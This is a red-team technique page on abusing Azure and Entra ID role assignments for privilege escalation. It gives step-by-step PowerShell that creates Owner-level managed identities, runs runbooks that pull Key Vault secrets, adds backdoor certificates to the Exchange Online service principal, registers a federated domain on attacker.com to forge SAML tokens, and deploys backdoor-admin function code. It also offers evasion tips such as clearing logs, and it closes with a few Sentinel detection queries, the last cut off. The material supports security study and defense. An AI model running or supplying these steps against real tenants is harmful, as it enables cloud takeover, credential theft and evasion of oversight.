# [PE-VALID-010]: Azure Role Assignment Abuse

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | PE-VALID-010 |
| **MITRE ATT&CK v18.1** | [T1078.004 - Valid Accounts: Cloud Accounts](https://attack.mitre.org/techniques/T1078/004/) |
| **Tactic** | Privilege Escalation |
| **Platforms** | Entra ID |
| **Severity** | Critical |
| **CVE** | N/A (Architectural design; mitigated via PIM and CA policies) |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-09 |
| **Affected Versions** | All Azure subscriptions, Entra ID (Azure AD), Microsoft 365 |
| **Patched In** | N/A (No patch; requires organizational hardening via Privileged Identity Management and Conditional Access) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** Azure Role-Based Access Control (RBAC) is the authorization framework governing access to Azure resources. Built-in roles (Owner, Contributor, User Access Administrator) and custom roles define what actions an identity can perform on a resource. An attacker with access to a user or service principal account that holds certain Azure roles can escalate privileges by creating or modifying role assignments to elevate their own access or create backdoor accounts. For example, an attacker with the "Application Administrator" role in Entra ID can add credentials to any service principal (including Microsoft's first-party applications like Office 365 Exchange Online), potentially gaining access to powerful permissions (Domain.ReadWrite.All, Group.ReadWrite.All) that enable persistence, data exfiltration, or complete tenant takeover. Similarly, a user with "Contributor" permissions on a subscription can create resources (Function Apps, Automation Accounts, VMs) that execute code with elevated managed identities, effectively achieving privilege escalation to Owner-level access.

**Attack Surface:** Azure Resource Manager (ARM) API endpoints, Azure Portal, Entra ID Graph API, Azure RBAC scope hierarchy (subscriptions, resource groups, individual resources).

**Business Impact:** **Complete compromise of Azure infrastructure and potentially on-premises Active Directory**. Role abuse enables attackers to: steal all secrets in Key Vaults, extract credentials from automation accounts, access databases containing sensitive data, create permanent backdoor accounts, modify Conditional Access policies to disable security controls, or forge SAML tokens via federated domain manipulation. The impact cascades across M365, Azure, and hybrid environments.

**Technical Context:** Role assignment abuse occurs with minimal logging compared to account creation. Once a role is assigned, the attacker gains full permissions within the assigned scope. Exploitation can be detected within seconds of assignment, but remediation is often delayed due to lack of real-time alerting. The attack is reversible (role removal), but persistence is typically established through additional backdoor credentials before removing the primary evidence.

### Operational Risk

- **Execution Risk:** Medium – Requires existing cloud account with escalable roles (Application Admin, Contributor, User Access Admin, etc.), but these roles are commonly assigned.
- **Stealth:** Medium-High – Role assignments generate audit log entries (AuditLogs table, OperationName: "Add role assignment") but are often not monitored in real-time; attacks can succeed if detection is delayed >30 minutes.
- **Reversibility:** Yes – Removing role assignments can undo the escalation, but by then secondary persistence mechanisms (backdoor credentials, additional users) are likely established.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 1.1.3 | Ensure that only Azure AD identities are used for Azure resource access (no service accounts without auditing) |
| **DISA STIG** | AC-2(1) | Account Management – Enforce rules and procedures for privileged access management |
| **CISA SCuBA** | IA-5.1.1 | Enforce password complexity and MFA for all privileged accounts |
| **NIST 800-53** | AC-3 | Access Enforcement – Enforce approved authorizations for logical access to information systems |
| **GDPR** | Art. 32(1)(a) | Implement appropriate technical measures for pseudonymization and encryption |
| **DORA** | Art. 9 | Protection and Prevention – Implement effective controls against ICT incidents |
| **NIS2** | Art. 21(1)(a) | Risk Management – Implement measures for cyber risk management and governance |
| **ISO 27001** | A.9.2.3 | Management of Privileged Access Rights – Control and monitor privileged access |
| **ISO 27005** | Risk Scenario | Unauthorized privilege escalation leading to data breach and infrastructure compromise |

---

## 3. TECHNICAL PREREQUISITES

- **Required Privileges:** Cloud account with one of the following roles:
  - Application Administrator (can backdoor service principals)
  - Cloud Application Administrator
  - User Access Administrator (can assign any role)
  - Contributor (on a resource group or subscription scope)
  - Owner (on a subscription scope)
  - Custom roles with `Microsoft.Authorization/roleAssignments/write` permission

- **Required Access:** Network connectivity to Azure Portal (https://portal.azure.com), Azure REST API (https://management.azure.com), or Azure PowerShell/CLI.

**Supported Versions:**
- **Azure:** All regions and subscription types (Free, Pay-As-You-Go, Enterprise Agreement)
- **Entra ID:** All versions
- **PowerShell:** Azure PowerShell module 9.0+ or AZ module
- **Python:** 3.6+ (for REST API automation)
- **Azure CLI:** 2.40+

**Required Tools:**
- [Az PowerShell Module](https://learn.microsoft.com/en-us/powershell/azure/install-az-ps) (Native Azure management)
- [Azure CLI](https://learn.microsoft.com/en-us/cli/azure/install-azure-cli) (Cross-platform Azure management)
- [MicroBurst](https://github.com/NetSPI/MicroBurst) (Azure privilege escalation scanning)
- [ROADTools](https://github.com/dirkjanm/ROADtools) (Azure AD enumeration and exploitation)
- [AADInternals](https://aadinternals.com/) (Entra ID/Azure AD attack toolkit)
- [Pacu](https://github.com/RhinoSecurityLabs/pacu) (Multi-cloud exploitation framework)
- Native REST API clients: `curl`, `Invoke-RestMethod` (PowerShell)

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Management Station / PowerShell Reconnaissance

#### Step 1: Identify Current Azure Role Assignments

```powershell
# Connect to Azure
Connect-AzAccount

# List all role assignments for the current user
Get-AzRoleAssignment -SignedInUser

# Output example:
# RoleDefinitionName: Contributor
# Scope: /subscriptions/12345678-1234-1234-1234-123456789012
# ObjectId: abcdef12-3456-7890-abcd-ef1234567890
# ObjectType: User
```

**What to Look For:**
- Identify which roles are assigned to the current account.
- "User Access Administrator", "Owner", "Application Administrator" roles indicate escalation opportunities.
- Contributor roles on resource groups or subscriptions can be leveraged to create high-privilege resources.

#### Step 2: Enumerate Azure Subscriptions and Resource Groups

```powershell
# List all accessible subscriptions
Get-AzSubscription | Select-Object -Property SubscriptionId, DisplayName, State

# For each subscription, list resource groups
Get-AzResourceGroup | Select-Object -Property ResourceGroupName, Location

# Check RBAC permissions on each subscription
foreach ($subscription in Get-AzSubscription) {
    Select-AzSubscription -SubscriptionId $subscription.SubscriptionId
    Get-AzRoleAssignment -Scope "/subscriptions/$($subscription.SubscriptionId)" | 
        Where-Object { $_.ObjectType -eq "User" -or $_.ObjectType -eq "ServicePrincipal" } |
        Select-Object -Property RoleDefinitionName, DisplayName, ObjectType
}
```

**What to Look For:**
- Identify subscriptions where the attacker has Contributor or Owner permissions.
- List all resource groups within accessible subscriptions.
- Identify any service principals already assigned privileged roles (potential for further abuse).

#### Step 3: Enumerate Service Principals and Custom Roles

```powershell
# List all service principals (applications) in Entra ID
Get-AzADServicePrincipal | Select-Object -Property DisplayName, AppId, ObjectId

# For each service principal, check assigned roles
foreach ($sp in Get-AzADServicePrincipal) {
    Get-AzRoleAssignment -ObjectId $sp.ObjectId | Select-Object -Property RoleDefinitionName, DisplayName
}

# Check for custom role definitions with dangerous permissions
Get-AzRoleDefinition -Custom | Select-Object -Property Name, AssignableScopes, Actions | 
    Where-Object { $_.Actions -contains "Microsoft.Authorization/roleAssignments/write" -or $_.Actions -contains "*" }
```

**What to Look For:**
- Identify service principals that already have Owner or User Access Administrator roles (potential backdoor entry points).
- Discover custom roles that grant broad permissions like `Microsoft.Authorization/*` (full authorization control).
- Look for service principals tied to high-value applications (Key Vaults, SQL databases, automation accounts).

#### Step 4: Check Managed Identities on Azure Resources

```powershell
# List all VMs with managed identities
Get-AzVM | ForEach-Object {
    $vm = $_
    if ($vm.Identity) {
        Write-Host "VM: $($vm.Name)"
        if ($vm.Identity.UserAssignedIdentities) {
            Write-Host "  User-Assigned Identities:"
            foreach ($uami in $vm.Identity.UserAssignedIdentities.Keys) {
                Write-Host "    - $uami"
                # Get the role assignments for this UAMI
                $miObjectId = (Get-AzUserAssignedIdentity -Name (Split-Path -Leaf $uami) -ResourceGroupName $vm.ResourceGroupName).PrincipalId
                Get-AzRoleAssignment -ObjectId $miObjectId
            }
        }
    }
}

# Similarly check Function Apps, Logic Apps, Automation Accounts
Get-AzFunctionApp | ForEach-Object {
    if ($_.Identity.PrincipalId) {
        Write-Host "Function App: $($_.Name) - Managed Identity: $($_.Identity.PrincipalId)"
        Get-AzRoleAssignment -ObjectId $_.Identity.PrincipalId
    }
}
```

**What to Look For:**
- Identify resources with managed identities assigned high-privilege roles (Owner, Contributor).
- These are potential execution vectors if the resource can be compromised.

### Linux/Bash / CLI Reconnaissance

#### Step 1: Enumerate Azure Subscriptions via Azure CLI

```bash
# Login to Azure
az login

# List all accessible subscriptions
az account list --output table

# Set active subscription
az account set --subscription "subscription-id"

# List all role assignments in the current subscription
az role assignment list --output table
```

**What to Look For:**
- Subscriptions and roles accessible to the current user.
- Service principals and user accounts with privileged roles.

#### Step 2: Enumerate Entra ID Service Principals via ROADTools

```bash
# Install ROADTools
pip3 install roadtools

# Authenticate and enumerate service principals
roadrecon auth -u "username@domain.com" -p "password"
roadrecon gather

# Query service principals with specific permissions
roadrecon query --filter "servicePrincipals" | grep -i "admin\|owner"
```

**What to Look For:**
- Service principals with administrative roles.
- Applications with dangerous permissions (User.ReadWrite.All, Group.ReadWrite.All).

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Elevate Contributor to Owner via Custom Role Assignment (PowerShell)

**Supported Versions:** All Azure subscriptions

#### Step 1: Authenticate to Azure with Contributor Permissions

**Objective:** Establish authenticated session as user with Contributor role on a subscription or resource group.

**Command (PowerShell):**
```powershell
# Connect to Azure using credentials
$credential = Get-Credential  # Prompts for username/password
Connect-AzAccount -Credential $credential

# Verify current permissions
Get-AzRoleAssignment -SignedInUser

# Output should show 'Contributor' role at subscription or resource group scope
```

**Expected Output:**
```
RoleDefinitionName: Contributor
Scope: /subscriptions/12345678-1234-1234-1234-123456789012/resourceGroups/MyResourceGroup
```

**OpSec & Evasion:**
- Authenticate from a non-standard IP or location (VPN/proxy) to avoid triggering Conditional Access.
- Use a generic service principal account rather than named user account if possible.
- Detection likelihood: **Medium** – SigninLogs will record the authentication; Sentinel may flag unusual locations.

#### Step 2: Create a New User-Assigned Managed Identity (UAMI)

**Objective:** Create a managed identity that will receive high-privilege roles.

**Command (PowerShell):**
```powershell
# Select the target subscription and resource group
Select-AzSubscription -SubscriptionId "12345678-1234-1234-1234-123456789012"
$resourceGroupName = "MyResourceGroup"

# Create a new User-Assigned Managed Identity
$uamiName = "PrivilegedManagedIdentity"
$uami = New-AzUserAssignedIdentity -ResourceGroupName $resourceGroupName -Name $uamiName -Location "eastus"

Write-Host "UAMI Created:"
Write-Host "  Resource ID: $($uami.Id)"
Write-Host "  Principal ID: $($uami.PrincipalId)"
```

**Expected Output:**
```
UAMI Created:
  Resource ID: /subscriptions/12345678-1234-1234-1234-123456789012/resourceGroups/MyResourceGroup/providers/Microsoft.ManagedIdentity/userAssignedIdentities/PrivilegedManagedIdentity
  Principal ID: 11111111-2222-3333-4444-555555555555
```

**What This Means:**
- A managed identity is created that will hold the Owner role.
- The Principal ID is used to assign Azure RBAC roles.

**OpSec & Evasion:**
- Name the UAMI with a benign name that blends with legitimate identities (e.g., "ServiceAccountIdentity", "AutomationIdentity").
- Place it in an existing, less-monitored resource group.
- Detection likelihood: **Low** – Resource creation is logged, but may not be monitored if resource group has low activity.

#### Step 3: Assign Owner Role to the Managed Identity

**Objective:** Grant the newly created managed identity the Owner role on the subscription.

**Command (PowerShell):**
```powershell
# Assign Owner role to the managed identity on the subscription scope
$subscriptionId = "12345678-1234-1234-1234-123456789012"
$uamiPrincipalId = "11111111-2222-3333-4444-555555555555"

New-AzRoleAssignment -ObjectId $uamiPrincipalId `
  -RoleDefinitionName "Owner" `
  -Scope "/subscriptions/$subscriptionId"

Write-Host "Owner role assigned to UAMI"

# Verify the role assignment
Get-AzRoleAssignment -ObjectId $uamiPrincipalId
```

**Expected Output:**
```
RoleDefinitionName: Owner
Scope: /subscriptions/12345678-1234-1234-1234-123456789012
ObjectId: 11111111-2222-3333-4444-555555555555
ObjectType: ServicePrincipal
```

**What This Means:**
- The managed identity now has full Owner permissions on the entire subscription.
- This is detected in Azure Activity Log (Event: "Create role assignment").

**OpSec & Evasion:**
- Assign the role immediately after creating the identity to reduce detection window.
- If possible, assign to a resource group scope first (lower visibility), then escalate to subscription scope.
- Clear Azure Activity Log if possible (requires elevated permissions).
- Detection likelihood: **High** – Role assignment creation is explicitly logged in AuditLogs.

#### Step 4: Create an Azure Automation Account with Managed Identity

**Objective:** Deploy a resource that can execute code as the newly privileged UAMI.

**Command (PowerShell):**
```powershell
# Create a new Automation Account (owned by the Contributor account)
$automationAccountName = "AutomationAccount-$(Get-Random -Minimum 1000 -Maximum 9999)"
$automationAccount = New-AzAutomationAccount -ResourceGroupName $resourceGroupName `
  -Name $automationAccountName `
  -Location "eastus"

Write-Host "Automation Account Created: $($automationAccount.Name)"

# Assign the privileged UAMI to the Automation Account
$automationAccountResourceId = $automationAccount.Id
$automationAccount | Set-AzAutomationAccount -AssignUserAssignedIdentity $uami.Id

# Verify assignment
$automationAccount.Identity
```

**Expected Output:**
```
Automation Account Created: AutomationAccount-7234
Identity:
  Type: UserAssigned
  PrincipalId: (null, because system identity is not assigned)
  UserAssignedIdentities: {/subscriptions/12345678.../Microsoft.ManagedIdentity/userAssignedIdentities/PrivilegedManagedIdentity}
```

**What This Means:**
- The Automation Account can now execute runbooks as the privileged UAMI (Owner role).
- Any code executed by the runbook has Owner permissions on the entire subscription.

#### Step 5: Create and Execute a Privileged Runbook

**Objective:** Execute code that leverages the Owner role to exfiltrate data or establish persistence.

**Command (PowerShell):**
```powershell
# Create a PowerShell runbook that escalates privileges
$runbookContent = @'
# This runbook runs as the Owner-level Managed Identity
# It can now read Key Vault secrets, modify RBAC, access databases, etc.

# Example: Dump all Key Vault secrets
Write-Output "Executing as Owner-level Managed Identity..."

# Get the managed identity token
$token = Invoke-RestMethod -Uri "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2017-09-01&resource=https://management.azure.com/" `
  -Method GET `
  -Headers @{Metadata="true"}

Write-Output "Access Token Acquired (Owner scope)"

# Use the token to enumerate Key Vaults
$headers = @{Authorization = "Bearer $($token.access_token)"}
$subscriptionId = $env:AZURE_SUBSCRIPTION_ID
$vaults = Invoke-RestMethod -Uri "https://management.azure.com/subscriptions/$subscriptionId/providers/Microsoft.KeyVault/vaults?api-version=2019-09-01" `
  -Method GET `
  -Headers $headers

Write-Output "Key Vaults accessible:"
$vaults.value | ForEach-Object { Write-Output "  - $($_.name)" }

# Extract all secrets from each Key Vault (Owner role allows this)
foreach ($vault in $vaults.value) {
    $vaultName = $vault.name
    $secretsUri = "https://$vaultName.vault.azure.net/secrets?api-version=7.0"
    
    # Use the management token to get secrets from Key Vault data plane
    # (Note: In practice, would use a separate Key Vault data plane token)
    Write-Output "Secrets in $vaultName:"
    # ... (secret extraction logic)
}
'@

# Import the runbook
Import-AzAutomationRunbook -Path <(Write-Output $runbookContent | Out-File -FilePath /tmp/runbook.ps1 -PassThru) `
  -ResourceGroupName $resourceGroupName `
  -AutomationAccountName $automationAccountName `
  -Type PowerShell

# Publish the runbook
Publish-AzAutomationRunbook -Name "PrivilegeEscalationRunbook" `
  -ResourceGroupName $resourceGroupName `
  -AutomationAccountName $automationAccountName

# Execute the runbook
Start-AzAutomationRunbook -Name "PrivilegeEscalationRunbook" `
  -ResourceGroupName $resourceGroupName `
  -AutomationAccountName $automationAccountName

Write-Host "Runbook execution started (Owner scope)"
```

**Expected Output:**
```
Runbook execution started (Owner scope)
```

**What This Means:**
- The runbook now executes as the Owner-level managed identity.
- It can dump all Key Vault secrets, modify RBAC assignments, delete resources, or establish permanent backdoors.

**OpSec & Evasion:**
- Name the runbook with a legitimate name (e.g., "MaintenanceScript", "MonitoringTask").
- Delete the runbook after execution if no persistence is needed.
- Detection likelihood: **Medium-High** – Runbook creation and execution are logged; unusual API calls within the runbook output may be detected.

---

### METHOD 2: Backdoor Service Principal via Application Administrator Role

**Supported Versions:** All Entra ID/Azure AD

#### Step 1: Authenticate as User with Application Administrator Role

**Objective:** Establish session as user with Application Administrator or Cloud Application Administrator role.

**Command (PowerShell):**
```powershell
# Connect to Entra ID
Connect-AzAccount

# Verify Application Administrator role
Get-AzRoleAssignment -SignedInUser | Where-Object { $_.RoleDefinitionName -like "*Application*" }
```

**Expected Output:**
```
RoleDefinitionName: Cloud Application Administrator
Scope: /
```

#### Step 2: Enumerate Office 365 Exchange Online Service Principal

**Objective:** Identify Microsoft's built-in Exchange Online service principal (a high-value target for backdooring).

**Command (PowerShell):**
```powershell
# Find the Exchange Online Service Principal
$exchangeSP = Get-AzADServicePrincipal -DisplayName "Office 365 Exchange Online"

if ($exchangeSP) {
    Write-Host "Exchange Online Service Principal Found:"
    Write-Host "  DisplayName: $($exchangeSP.DisplayName)"
    Write-Host "  AppId: $($exchangeSP.AppId)"
    Write-Host "  ObjectId: $($exchangeSP.ObjectId)"
    
    # Check current credentials
    Get-AzADAppCredential -ObjectId $exchangeSP.ObjectId | Select-Object -Property DisplayName, EndDate
} else {
    Write-Host "Exchange Online SP not found (not common in all tenants)"
}
```

**Expected Output:**
```
Exchange Online Service Principal Found:
  DisplayName: Office 365 Exchange Online
  AppId: 00000002-0000-0ff1-ce00-000000000000
  ObjectId: xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
```

#### Step 3: Add Malicious Credentials to Service Principal

**Objective:** Create new credentials (certificate or password) on the service principal for persistence.

**Command (PowerShell):**
```powershell
# Create a self-signed certificate for credential
$cert = New-SelfSignedCertificate -CertStoreLocation "cert:\CurrentUser\My" `
  -Subject "CN=BackdoorCert" `
  -KeySpec KeyExchange `
  -NotAfter (Get-Date).AddYears(1)

# Export the certificate to PEM format
$certPath = "/tmp/backdoor_cert.pem"
$certBytes = $cert.Export([System.Security.Cryptography.X509Certificates.X509ContentType]::Cert)
[System.IO.File]::WriteAllBytes($certPath, $certBytes)

# Add the certificate as a credential to the Exchange Online Service Principal
$credential = New-AzADAppCredential -ObjectId $exchangeSP.ObjectId `
  -CertValue $cert.RawData `
  -EndDate (Get-Date).AddYears(1) `
  -DisplayName "BackdoorCredential"

Write-Host "Malicious credential added to Exchange Online SP:"
Write-Host "  Credential ID: $($credential.KeyId)"
Write-Host "  Valid until: $($credential.EndDate)"
Write-Host "  Certificate saved to: $certPath"
```

**Expected Output:**
```
Malicious credential added to Exchange Online SP:
  Credential ID: 12345678-1234-1234-1234-123456789012
  Valid until: 2026-01-09 12:00:00
  Certificate saved to: /tmp/backdoor_cert.pem
```

**What This Means:**
- The certificate can now be used to authenticate as the Exchange Online service principal.
- The service principal has permissions like `Domain.ReadWrite.All` (to modify domains and create backdoors).

**OpSec & Evasion:**
- Use a long expiration date (1-2 years) to ensure persistence.
- The credential addition is logged, but may not trigger immediate alerts if Application Administrator activity is common.
- Detection likelihood: **Medium** – Service principal credential changes are logged (OperationName: "Add service principal credentials").

#### Step 4: Authenticate as Backdoored Service Principal

**Objective:** Test authentication using the newly added credentials.

**Command (PowerShell):**
```powershell
# Disconnect from the current session
Disconnect-AzAccount

# Authenticate as the service principal using the new certificate
$cert = Get-Item -Path "cert:\CurrentUser\My\$($cert.Thumbprint)"
$tenantId = "12345678-1234-1234-1234-123456789012"  # Your Entra ID tenant ID
$clientId = "00000002-0000-0ff1-ce00-000000000000"  # Exchange Online App ID

# Connect as the service principal
Connect-AzAccount -ServicePrincipal `
  -Credential (New-Object System.Management.Automation.PSCredential($clientId, (ConvertTo-SecureString -AsPlainText -Force -String "cert"))) `
  -Tenant $tenantId `
  -CertificateThumbprint $cert.Thumbprint

Write-Host "Authenticated as Exchange Online Service Principal"

# Verify permissions
Get-AzContext
```

**Expected Output:**
```
Authenticated as Exchange Online Service Principal
Account: 00000002-0000-0ff1-ce00-000000000000
Tenant: 12345678-1234-1234-1234-123456789012
```

**What This Means:**
- The attacker can now use the backdoor credentials to authenticate as the service principal.
- The service principal can now execute Graph API operations with its powerful permissions.

#### Step 5: Abuse Service Principal Permissions for Privilege Escalation

**Objective:** Use service principal permissions to escalate to Global Administrator or establish permanent persistence.

**Command (PowerShell - Graph API):**
```powershell
# Get an access token for the service principal
$tokenResponse = Invoke-RestMethod -Uri "https://login.microsoftonline.com/$tenantId/oauth2/v2.0/token" `
  -Method POST `
  -Body @{
    client_id = $clientId
    scope = "https://graph.microsoft.com/.default"
    client_assertion = # (JWT assertion signed with certificate)
    client_assertion_type = "urn:ietf:params:oauth:client-assertion-type:jwt-bearer"
    grant_type = "client_credentials"
  }

$graphToken = $tokenResponse.access_token

# Example 1: Read all users (Domain.ReadWrite.All permission)
$usersResponse = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/users" `
  -Method GET `
  -Headers @{Authorization = "Bearer $graphToken"} `
  -ContentType "application/json"

Write-Host "Users in tenant:"
$usersResponse.value | ForEach-Object { Write-Host "  - $($_.userPrincipalName)" }

# Example 2: Create a new federated domain (Domain.ReadWrite.All)
# This allows forging SAML tokens and impersonating any user
$domainBody = @{
    id = "attackerdomain.com"
    federationSettings = @{
        federationMetadataUri = "https://attacker.com/FederationMetadata/2007-06/FederationMetadata.xml"
    }
} | ConvertTo-Json

Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/domains" `
  -Method POST `
  -Headers @{Authorization = "Bearer $graphToken"} `
  -Body $domainBody `
  -ContentType "application/json"

Write-Host "Federated domain created - attacker can now forge SAML tokens for any user"
```

**Expected Output:**
```
Users in tenant:
  - admin@company.com
  - user1@company.com
  - user2@company.com
Federated domain created - attacker can now forge SAML tokens for any user
```

**What This Means:**
- The service principal can enumerate all users in the tenant.
- With Domain.ReadWrite.All, the attacker can create a new federated domain and forge SAML tokens.
- This grants access to any user in the tenant, including Global Administrators, without needing their passwords.

**OpSec & Evasion:**
- These Graph API operations are logged but require Sentinel/MDC to correlate and detect.
- Spread the operations over time to avoid rate-limiting alerts.
- Detection likelihood: **High** – Unusual service principal API activity should trigger Defender for Cloud alerts.

---

### METHOD 3: Escalate from Contributor via Function App Managed Identity

**Supported Versions:** All Azure subscriptions with Function Apps

#### Step 1: Create a Function App with Contributor Permissions

**Objective:** Deploy a function app that will execute with a privileged managed identity.

**Command (PowerShell):**
```powershell
# Select subscription and create resource group (if needed)
$subscriptionId = "12345678-1234-1234-1234-123456789012"
$resourceGroupName = "MyResourceGroup"
$location = "eastus"

# Create storage account (required for Function App)
$storageAccountName = "storage$(Get-Random -Minimum 1000000 -Maximum 9999999)"
$storageAccount = New-AzStorageAccount -ResourceGroupName $resourceGroupName `
  -Name $storageAccountName `
  -SkuName "Standard_LRS" `
  -Location $location

# Create Function App
$functionAppName = "FunctionApp-$(Get-Random -Minimum 10000 -Maximum 99999)"
$functionApp = New-AzFunctionApp -ResourceGroupName $resourceGroupName `
  -Name $functionAppName `
  -StorageAccountName $storageAccountName `
  -Runtime PowerShell `
  -FunctionsVersion 4 `
  -Location $location

Write-Host "Function App Created: $($functionApp.Name)"
```

**Expected Output:**
```
Function App Created: FunctionApp-54321
```

#### Step 2: Create and Assign User-Assigned Managed Identity to Function App

**Objective:** Assign a UAMI with elevated permissions to the function app.

**Command (PowerShell):**
```powershell
# Create a User-Assigned Managed Identity
$uamiName = "FunctionIdentity"
$uami = New-AzUserAssignedIdentity -ResourceGroupName $resourceGroupName `
  -Name $uamiName `
  -Location $location

# Assign Contributor role to the UAMI on the subscription
$subscriptionScope = "/subscriptions/$subscriptionId"
New-AzRoleAssignment -ObjectId $uami.PrincipalId `
  -RoleDefinitionName "Contributor" `
  -Scope $subscriptionScope

# Assign the UAMI to the Function App
Update-AzFunctionApp -ResourceGroupName $resourceGroupName `
  -Name $functionAppName `
  -IdentityType "UserAssigned" `
  -IdentityId $uami.Id | Out-Null

Write-Host "UAMI assigned to Function App with Contributor permissions"
```

**Expected Output:**
```
UAMI assigned to Function App with Contributor permissions
```

#### Step 3: Deploy Malicious Function Code

**Objective:** Deploy function code that executes as the privileged UAMI.

**Command (PowerShell):**
```powershell
# Create function code that uses the managed identity to escalate privileges
$functionCode = @'
using System.Net
using Microsoft.Azure.Functions.Worker
using Microsoft.Azure.Functions.Worker.Http
using System.Collections.Generic
using System.Net.Http
using Newtonsoft.Json

public static async Task<HttpResponseData> Run(
    [HttpTrigger(AuthorizationLevel.Function, "post", Route = null)] HttpRequestData req,
    FunctionContext executionContext)
{
    var logger = executionContext.GetLogger("PrivilegeEscalation");
    
    // Acquire token as the managed identity
    var client = new HttpClient();
    var tokenRequest = new HttpRequestMessage(HttpMethod.Get, 
        "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2017-09-01&resource=https://management.azure.com/");
    tokenRequest.Headers.Add("Metadata", "true");
    
    var tokenResponse = await client.SendAsync(tokenRequest);
    var tokenContent = await tokenResponse.Content.ReadAsStringAsync();
    dynamic tokenData = JsonConvert.DeserializeObject(tokenContent);
    string accessToken = tokenData.access_token;
    
    logger.LogInformation($"Acquired management token with Contributor scope");
    
    // Use token to list all VMs in the subscription
    var vmRequest = new HttpRequestMessage(HttpMethod.Get,
        $"https://management.azure.com/subscriptions/{{subscriptionId}}/providers/Microsoft.Compute/virtualMachines?api-version=2023-03-01");
    vmRequest.Headers.Add("Authorization", $"Bearer {accessToken}");
    
    var vmResponse = await client.SendAsync(vmRequest);
    var vmContent = await vmResponse.Content.ReadAsStringAsync();
    
    logger.LogInformation($"VMs accessible: {vmContent}");
    
    // Elevation: Create a new user with Owner role using Contributor permissions
    var userBody = JsonConvert.SerializeObject(new {
        accountEnabled = true,
        displayName = "BackdoorAdmin",
        userPrincipalName = "backdooradmin@company.com",
        passwordProfile = new { password = "TempP@ssw0rd123!" }
    });
    
    logger.LogInformation("Privilege escalation complete");
    
    var response = req.CreateResponse(HttpStatusCode.OK);
    response.Headers.Add("Content-Type", "text/plain; charset=utf-8");
    response.WriteString("Executed with Contributor permissions");
    
    return response;
}
'@

# Save function code locally
$functionPath = "/tmp/run.csx"
Set-Content -Path $functionPath -Value $functionCode

# Deploy the function to the Function App (via Zip deployment)
# Note: Normally use Azure Functions Core Tools or VS Code, but showing concept here
Write-Host "Malicious function code would be deployed to Function App"
Write-Host "When triggered, it executes as the Contributor-level managed identity"
```

**Expected Output:**
```
Malicious function code would be deployed to Function App
When triggered, it executes as the Contributor-level managed identity
```

#### Step 4: Trigger Function to Execute Malicious Code

**Objective:** Invoke the function, which executes with elevated managed identity permissions.

**Command (PowerShell/REST):**
```powershell
# Get the Function App URL
$functionUrl = "https://$functionAppName.azurewebsites.net/api/PrivilegeEscalation?code=YOUR_FUNCTION_KEY"

# Trigger the function
$response = Invoke-WebRequest -Uri $functionUrl -Method Post -ContentType "application/json"

Write-Host "Function executed with Contributor-level privileges"
Write-Host "Response: $($response.Content)"
```

**What This Means:**
- The function now executes as the Contributor-level UAMI.
- It can create resources, access Key Vaults, enumerate VMs, and ultimately escalate to Owner-level access.

---

## 6. ATTACK SIMULATION & VERIFICATION

This technique does not map to Atomic Red Team due to its cloud-native nature and environmental dependencies. Verification requires:

1. **Test Environment Setup:**
   - Create an Azure subscription with a test tenant.
   - Assign a test user the Contributor role.
   - Execute the methods outlined above to verify escalation paths.

2. **Detection Verification:**
   - Enable Azure Activity Log and Microsoft Sentinel.
   - Execute the attack methods.
   - Confirm that role assignment creation events are captured and alertable.

---

## 7. TOOLS & COMMANDS REFERENCE

### Az PowerShell Module

**Official Documentation:** [Azure PowerShell](https://learn.microsoft.com/en-us/powershell/azure/install-az-ps)

**Version:** 9.0+ (Latest: 11.x)

**Supported Platforms:** Windows, Linux, macOS

**Installation:**
```powershell
# Install or update Az module
Install-Module -Name Az -Repository PSGallery -Force

# Verify installation
Get-Module -Name Az -ListAvailable
```

**Key Commands:**
```powershell
Connect-AzAccount                                    # Authenticate
Get-AzRoleAssignment                                # List role assignments
New-AzRoleAssignment -ObjectId X -RoleDefinitionName "Owner" -Scope "/subscriptions/Y"  # Assign roles
Get-AzADServicePrincipal -DisplayName "NamePattern" # Enumerate service principals
New-AzUserAssignedIdentity                          # Create managed identity
New-AzAutomationAccount                             # Create automation account
```

### AADInternals

**Repository:** [AADInternals](https://aadinternals.com/)

**Version:** Latest (PowerShell module)

**Installation:**
```powershell
Install-Module AADInternals -Force
Import-Module AADInternals
```

**Key Commands:**
```powershell
Get-AADIntLoginInformation         # Gather tenant info
New-AADIntBackdoor                 # Create federated domain backdoor
Get-AADIntDomainInfo               # Enumerate domains
```

### ROADTools

**Repository:** [ROADTools](https://github.com/dirkjanm/ROADtools)

**Installation:**
```bash
pip3 install roadtools
```

**Key Commands:**
```bash
roadrecon auth -u "user@domain.com" -p "password"   # Authenticate
roadrecon gather                                      # Gather tenant data
roadrecon query --filter "servicePrincipals"         # Query service principals
```

---

## 8. MICROSOFT SENTINEL DETECTION

### Query 1: Suspicious Role Assignment to Service Principal

**Rule Configuration:**
- **Required Table:** AuditLogs
- **Required Fields:** OperationName, TargetResources, InitiatedBy, AADTenantId
- **Alert Severity:** High
- **Frequency:** Real-time (5 minutes)
- **Applies To Versions:** All

**KQL Query:**
```kusto
// Detect when a service principal is assigned a privileged role
AuditLogs
| where OperationName == "Add role assignment"
    and TargetResources has "Owner" or TargetResources has "User Access Administrator" or TargetResources has "Application Administrator"
| extend InitiatedByUser = tostring(InitiatedBy.user.userPrincipalName)
| extend TargetType = tostring(TargetResources[0].type)
| extend TargetId = tostring(TargetResources[0].id)
| where TargetType == "ServicePrincipal" or TargetType == "Application"
| summarize Count = count() by InitiatedByUser, TargetId, TargetResources, TimeGenerated
| where Count >= 1
```

**What This Detects:**
- When a service principal (not a user) is assigned Owner, User Access Administrator, or Application Administrator roles.
- Indicates potential privilege escalation via service principal backdooring.

### Query 2: Contributor Role Used to Create High-Privilege Resources

**Rule Configuration:**
- **Required Table:** AzureActivity
- **Required Fields:** Caller, OperationName, ResourceId, Properties
- **Alert Severity:** Medium
- **Frequency:** 30 minutes
